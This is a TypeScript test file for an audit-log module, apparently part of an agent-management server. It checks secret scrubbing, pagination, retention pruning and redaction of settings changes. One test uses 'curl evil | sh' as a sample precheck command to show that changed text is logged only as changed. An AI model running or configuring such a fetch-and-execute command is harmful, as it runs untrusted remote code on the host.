import './setup.ts'
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { audit, AUDIT_DAYS, listAudit, pruneAudit, scrub, settingsChanges } from '../server/audit.ts'
import { run } from '../server/db.ts'
import { defaultSettings, mergeSettings } from '../server/core.ts'

test('secret-looking fields never reach the log, only that they were there', () => {
  run('DELETE FROM audit_log')
  audit('Owner', 'provider.access', 'deepseek', { apiKey: 'sk-live-123', nested: { token: 'abc', mode: 'apikey' } })
  const [entry] = listAudit()
  assert.equal(entry.actor, 'Owner')
  assert.equal(entry.action, 'provider.access')
  assert.deepEqual(entry.detail, { apiKey: true, nested: { token: true, mode: 'apikey' } })
  assert.doesNotMatch(JSON.stringify(entry), /sk-live-123|abc/)
  assert.deepEqual(scrub({ AGENTDECK_SECRET: 'x', password: 'y', list: ['a'] }), {
    AGENTDECK_SECRET: true,
    password: true,
    list: ['a'],
  })
})

test('pages run newest first and continue before the last id', () => {
  run('DELETE FROM audit_log')
  for (let i = 0; i < 7; i++) audit('Owner', 'agent.update', `P/${i}`)
  const first = listAudit(3)
  assert.deepEqual(first.map((e) => e.target), ['P/6', 'P/5', 'P/4'])
  const second = listAudit(3, first.at(-1)!.id)
  assert.deepEqual(second.map((e) => e.target), ['P/3', 'P/2', 'P/1'])
  assert.equal(listAudit(500).length, 7) // capped at 200, so all seven
  assert.equal(listAudit('x', 'y').length, 7) // garbage falls back to the defaults
})

test('housekeeping drops entries older than the retention', () => {
  run('DELETE FROM audit_log')
  const now = Date.now()
  run("INSERT INTO audit_log (at, actor, action) VALUES (?, 'Owner', 'old')", now - (AUDIT_DAYS + 1) * 86_400_000)
  audit('Owner', 'new')
  assert.equal(pruneAudit(now), 1)
  assert.deepEqual(listAudit().map((e) => e.action), ['new'])
})

test('settings changes keep numbers and switches, text only as changed', () => {
  const before = defaultSettings()
  const after = mergeSettings({
    ...before,
    maxConcurrent: 5,
    autonomous: true,
    precheck: { ...before.precheck, command: 'curl evil | sh' },
  })
  assert.deepEqual(settingsChanges(before, after), {
    maxConcurrent: { from: 3, to: 5 },
    autonomous: { from: false, to: true },
    'precheck.command': 'geändert',
  })
  assert.deepEqual(settingsChanges(before, mergeSettings(before)), {})
})
